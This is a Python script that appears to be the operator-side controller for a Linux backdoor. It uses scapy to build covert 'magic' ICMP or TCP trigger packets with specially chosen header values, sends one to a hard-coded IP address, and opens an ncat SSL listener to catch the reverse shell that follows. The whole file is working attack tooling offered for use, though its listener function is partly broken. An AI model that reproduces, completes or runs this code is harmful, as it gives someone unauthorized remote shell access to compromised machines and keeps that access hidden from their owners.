"""
This program is a home side program to use the linux backdoor.
It generates the right packets, listens on the right port and gives you a
shell.
"""

from scapy.all import *
from random import randint
import subprocess
import sys
import threading
import time

# IP configurations
DEST_IP = "2.22.94.228"
IP_ID_DIVIDE = 17
MIN_IP_ID = 1000
MAX_IP_ID = 65535  # 16 bit

# ICMP configurations
ICMP_ID_DIVIDE = 3
MIN_ICMP_ID = 1
MAX_ICMP_ID = 300

ICMP_SEQ_DIVIDE = 7
MIN_ICMP_SEQ = 1
MAX_ICMP_SEQ = 300
ICMP_REQUEST_TYPE = 8  # ECHO

# TCP configurations
SOURCE_PORT = 3479
DEST_PORT = 443
TCP_WINDOW_DIVIDE = 113
MIN_TCP_WINDOW = 1000
MAX_TCP_WINDOW = 10000

# Other configurations
NCAT_PATH = r'D:\bin\ncat.exe'
TERMINAL_PATH = r'C:\Windows\System32\cmd.exe'
LISTEN_PORT = 1234


def get_random_divides_by(min_limit, max_limit, divides_by):
    """
    get a random int that devides by another int.
    :param min_limit: int
    :param max_limit: int
    :param divides_by: int
    :return: int
    """
    if divides_by <= 0:
        print("Whoops, can't divide by 0.")
        return -1

    # get random int that divides by another int
    random_int = randint(min_limit // divides_by, max_limit // divides_by)
    return random_int * divides_by


def generate_magic_packet(dest_ip, tcp=False):
    """
    This func generates a magic packet according to the configurations.
    It can be an ICMP packet or a TCP packet.
    Just send it to get shell...
    :param dest_ip: str, the IP of the destination
    :param tcp: bool
    :return: scapy.layers.inet.IP (scapy packet)
    """
    # The basic IP layer - ID is special
    p = IP()
    p.dst = dest_ip
    p.id = get_random_divides_by(MIN_IP_ID, MAX_IP_ID, IP_ID_DIVIDE)

    # If TCP option is enabled, craft a magic TCP packet
    if tcp:
        p = p / TCP()
        p.sport = SOURCE_PORT
        p.dport = DEST_PORT
        p.window = get_random_divides_by(
            MIN_TCP_WINDOW, MAX_TCP_WINDOW, TCP_WINDOW_DIVIDE)
    else:
        p = p / ICMP(
            id=get_random_divides_by(MIN_ICMP_ID, MAX_ICMP_ID, ICMP_ID_DIVIDE))
        p.type = ICMP_REQUEST_TYPE
        p.seq = get_random_divides_by(
            MIN_ICMP_SEQ, MAX_ICMP_SEQ, ICMP_SEQ_DIVIDE)

    return p


def start_listening_terminal(listen_port, ssl=True):
    """
    Start listening with ncat on specified port.
    With or without ssl option (should always be True!!!)
    :param listen_port: int
    :param ssl: bool
    :return: None
    """
    print("This function is not yet working!!!")
    
    # Create the main command to run in the new terminal
    ncat_command = "{} -vklp {}".format(NCAT_PATH, listen_port)
    ncat_command = ncat_command + " --ssl" if ssl else ncat_command

    # The command to run finally
    # Windows:
    if sys.platform.startswith("win"):
        command = "start /wait {}".format(ncat_command)
        shell_option = True
    # Linux:
    elif sys.platform.startswith("linux"):
        command = [TERMINAL_PATH, '-c', ncat_command]
        shell_option = False
    else:
        print("We do not support something that's not windows or linux.")
        return

    print("executing {}".format(command))
    subprocess.call(command, shell=shell_option)


def listen(listen_port, ssl=True):
    """
    Start listening but on different thread.
    :param listen_port: int
    :param ssl: bool
    :return: None
    """
    t = threading.Thread(target=start_listening_terminal,
                         args=(listen_port, ssl))
    t.start()


def hack_it():
    """
    Get reverse shell from destination
    :return: None
    """
    # Start Listening
    listen(LISTEN_PORT)
    time.sleep(3)

    # Create and send magic packet
    p = generate_magic_packet(DEST_IP)  # tcp=False
    send(p)

    # Enjoy :)


def main():
    """
    Main.
    :return: none
    """
    hack_it()


if __name__ == '__main__':
    main()
